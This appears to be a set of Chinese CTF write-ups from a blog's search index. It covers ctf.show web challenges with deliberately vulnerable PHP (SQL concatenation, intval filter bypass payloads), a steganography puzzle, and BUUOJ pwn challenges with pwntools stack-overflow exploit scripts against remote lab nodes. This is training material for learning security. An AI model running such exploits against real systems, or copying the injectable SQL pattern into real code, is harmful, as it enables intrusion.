+<a id="more"></a></p>
+<h1 id="question1"><a class="anchor" href="#question1">#</a> Question1</h1>
+<h2 id="源码"><a class="anchor" href="#源码">#</a> 源码:</h2>
+<p><pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;ctf.show萌新计划web1&lt;&#x2F;title&gt;
+    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;?php
+# 包含数据库连接文件
+include(&quot;config.php&quot;);
+# 判断get提交的参数id是否存在
+if(isset($_GET[&#39;id&#39;])){
+    $id &#x3D; $_GET[&#39;id&#39;];
+    # 判断id的值是否大于999
+    if(intval($id) &gt; 999){
+        # id 大于 999 直接退出并返回错误
+        die(&quot;id error&quot;);
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql &#x3D; &quot;select * from article where id &#x3D; $id order by id limit 1 &quot;;
+        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;
+        # 执行sql 语句
+        $result &#x3D; $conn-&gt;query($sql);
+        # 判断有没有查询结果
+        if ($result-&gt;num_rows &gt; 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row &#x3D; $result-&gt;fetch_assoc()) {
+                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;
+            }
+        }
+        # 关闭数据库连接
+        $conn-&gt;close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?&gt;
+&lt;&#x2F;body&gt;
+&lt;!-- flag in id &#x3D; 1000 --&gt;
+&lt;&#x2F;html&gt;</code></pre></p>
+<p>参考 &lt; a href=&quot;<a href="https://blog.csdn.net/qq_41617034/article/details/94040212">https://blog.csdn.net/qq_41617034/article/details/94040212</a>&quot;&gt;CG-CTF&lt;/a&gt; 才知道这题考察的是 intval 漏洞，需要满足 id=1000，同时 intval ($id)&gt;999 要返回 false;</p>
+<p>&lt;li&gt; 这里可以使用 '1000' 字符绕过，'1000' 进行 intval 后还是 1000 (&quot;1000&quot; 同理) &lt;/li&gt;</p>
+<p>&lt;li&gt;125&lt;&lt; 3 也可以，而 8000&gt;&gt;3 却不行.&lt;/li&gt;</p>
+<p>&lt;li&gt; 当然可以使用 680|320 绕过 &lt;/li&gt;</p>
+<p>&lt;li&gt; 也可以使用 hex (16 进制) 绕过：例如 0x3e8&lt;/li&gt;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png">https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png</a>&quot; &gt;</p>
+<p>任意一种方法都可 get flag</p>
+<h1 id="question2"><a class="anchor" href="#question2">#</a> Question2</h1>
+<h2 id="源码-2"><a class="anchor" href="#源码-2">#</a> 源码</h2>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="2"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="3"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="4"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="5"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="6"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="7"></td><td><pre>    if(preg_match("/or|\+/i",$id))&#123;</pre></td></tr><tr><td data-num="8"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="9"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="10"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="11"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="13"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="14"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="15"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="16"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="17"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="18"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="19"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="20"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="21"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="22"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="23"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="24"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="25"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="26"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="27"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="28"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="29"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="30"></td><td><pre>    </pre></td></tr><tr><td data-num="31"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="32"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="33"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>?></span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>&lt;li&gt;keycode：&lt;/li&gt;<br />
+&lt;pre&gt;&lt;code&gt;<br />
+if(preg_match(&quot;/or|+/i&quot;,$id))<br />
+&lt;/code&gt;&lt;/pre&gt;</p>
+<p>payload: 同样用 '1000' 绕过</p>
+<h1 id="question3"><a class="anchor" href="#question3">#</a> Question3</h1>
+<h2 id="源码-3"><a class="anchor" href="#源码-3">#</a> 源码</h2>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="8"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="9"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="10"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="11"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="13"></td><td><pre>    if(preg_match("/or|\-|\\|\*|\&lt;|\>|\!|x|hex|\+/i",$id))&#123;</pre></td></tr><tr><td data-num="14"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="15"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="16"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="17"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="18"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="19"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="20"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="21"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="22"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="23"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="24"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="25"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="26"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="27"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="28"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="29"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="30"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="31"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="32"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="33"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="34"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="35"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="38"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="39"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>?></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>&lt;li&gt;keycode:&lt;/li&gt;<br />
+&lt;pre&gt;&lt;code&gt;<br />
+if(preg_match(&quot;/or|-|\|*|&lt;|&gt;|!|x|hex|+/i&quot;,$id))<br />
+&lt;/code&gt;&lt;/pre&gt;<br />
+ 同理</p>
+<h1 id="question4"><a class="anchor" href="#question4">#</a> Question4</h1>
+<h2 id="源码-4"><a class="anchor" href="#源码-4">#</a> 源码</h2>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="8"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="9"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="10"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="11"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="13"></td><td><pre>    if(preg_match("/or|\-|\\\|\/|\\*|\&lt;|\>|\!|x|hex|\(|\)|\+|select/i",$id))&#123;</pre></td></tr><tr><td data-num="14"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="15"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="16"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="17"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="18"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="19"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="20"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="21"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="22"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="23"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="24"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="25"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="26"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="27"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="28"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="29"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="30"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="31"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="32"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="33"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="34"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="35"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="38"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="39"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>?></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>&lt;li&gt;keycode:&lt;/li&gt;<br />
+&lt;pre&gt;&lt;code&gt;<br />
+if(preg_match(&quot;/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br />
+&lt;/code&gt;&lt;/pre&gt;</p>
+<p>payload: 使用 '1000'</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>请问大吉杯的签到是在这里签吗?</title>
+    <url>/2021/01/27/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/</url>
+    <content><![CDATA[<p>之前没接触过 zlib 文件格式；一直在思考如何将文件中的 zlib 解压，这一题整整忙了我两天.<br />
+ 我是傻逼.<br />
+<a id="more"></a></p>
+<h2 id="notepad查看"><a class="anchor" href="#notepad查看">#</a> Notepad 查看</h2>
+<p>把下载下来的 png 用 Notepad 打开，发现里面还藏着一个 png.</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png">https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png</a>&quot; &gt;</p>
+<h2 id="我们用binwalk分离一下"><a class="anchor" href="#我们用binwalk分离一下">#</a> 我们用 binwalk 分离一下</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png">https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png</a>&quot; &gt;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png">https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png</a>&quot; &gt;</p>
+<p>发现分离文件中有一张 png, 一张在 zip 里的 png，一份空白文档 (我以为有什么妙用，缩放 (并不是) 二维码什么的) 以及一份 zlib 文件；(接下来的几天里我一直在攻略这份 zlib)</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png">https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png</a>&quot; &gt;</p>
+<p>依据在此，我更加确信这是出错在 zlib. 于是在搜索引擎里不断地搜索关于 zlib 解压的方法 (我是傻逼)<br />
+···<br />
+···<br />
+后来，我才知道，有 zlib 说明大概率是 LSB 隐写；</p>
+<p>在此之前，我先把分离出的 4 张 png 都扫了一遍</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg">https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg</a>&quot; &gt;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg">https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg</a>&quot; &gt;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg">https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg</a>&quot; &gt;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg">https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg</a>&quot; &gt;</p>
+<p>可以清楚地知道，第二张图已经明确告诉我们扫到第二张就行了，error 就在 png2;</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png">https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png</a>&quot; &gt;</p>
+<h2 id="放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子"><a class="anchor" href="#放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子">#</a> 放入 stegsolve (记住此刻原图的形状，我觉得倒像是一只兔子)</h2>
+<p>然后我们查看最低位通道图</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png">https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png</a>&quot; &gt;</p>
+<p>是的，没看错，二维码变了；但是还不可以扫喔.<br />
+ 接下来我们需要将原图和这张二维码异或一下.</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png">https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png</a>&quot; &gt;<br />
+ 不过我还找到另一个简便的出现方式<br />
+ &lt; img src=&quot;<a href="https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png">https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png</a>&quot; &gt;<br />
+ 不约而同地，两张图都出现了神秘的符号；<br />
+ 百度后了解了这是猪圈密码.<br />
+&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png">https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png</a>&quot; &gt;</p>
+<p>按照这个解密就好了；</p>
+<p dajiadoaidjb="">最后得到 flag:flag</p>
+<p>还是挺简单的，但是之前没接触过 zlib,stegsolve 用得也不熟练，导致这几天 steam 时长大大缩小 /(ㄒ o ㄒ)/~~</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>砰！</title>
+    <url>/2021/01/26/pwn/</url>
+    <content><![CDATA[<p>放假在家准备接触一下从未挑战过的 pwn<br />
+<a id="more"></a></p>
+<h1 id="pwn1_sctf_2016"><a class="anchor" href="#pwn1_sctf_2016">#</a> pwn1_sctf_2016</h1>
+<h2 id="download文件后checksec"><a class="anchor" href="#download文件后checksec">#</a> Download 文件后 checksec</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png">https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png</a>&quot; &gt;</p>
+<p>地址在哪已经显而易见了，接着我们 IDA 静态分析一下；</p>
+<h2 id="找到漏洞函数"><a class="anchor" href="#找到漏洞函数">#</a> 找到漏洞函数</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png">https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png</a>&quot; &gt;</p>
+<p>s 的长度为 60, 而我们只能够输入 32 个字符，不足以栈溢出；<br />
+ 但是 replace 函数会把我们输入的 I 替换成 you,I 是一个字符，you 是三个字符，这样输入 20 个 I 既不会超过 32 字符限制，最终替换成 60 个字符也能够填满 s.</p>
+<h3 id="找到后门函数08048f0d"><a class="anchor" href="#找到后门函数08048f0d">#</a> 找到后门函数：08048F0D</h3>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png">https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png</a>&quot; &gt;</p>
+<p>&lt;li&gt;exp:&lt;/li&gt;</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27833</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行结果:</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png">https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png</a>&quot; &gt;</p>
+<p 5e9a24f6-ddb2-4237-b3e0-6d968c34cec8="">拿到 flag:<br />
+flag</p>
+<h1 id="warmup_csaw_2016"><a class="anchor" href="#warmup_csaw_2016">#</a> warmup_csaw_2016</h1>
+<p>拖入 IDA F5</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png">https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png</a>&quot; &gt;</p>
+<p>发现要求输入 v5 自变量；</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png">https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png</a>&quot; &gt;</p>
+<p>v5 的可用栈大小为 0x40<br />
+ 可以看出，这个 gets 绝对有问题；</p>
+<p>程序存在后门:</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png">https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png</a>&quot; &gt;</p>
+<p>sub_40060D 的地址为 0x40060D</p>
+<p>下面我们可以写个脚本跑出 flag;<br />
+ 在此之前我们知道 v5 的栈大小为 0x40, 但还需要加上返回值的 8 个字符；<br />
+ 最终为 0x48.</p>
+<p>&lt;li&gt; 构造 exp&lt;/li&gt;</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28395</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png">https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png</a>&quot; &gt;</p>
+<p a15dd406-0d79-4f49-b5a0-3dde546a4d3d="">得到 flag:<br />
+flag</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
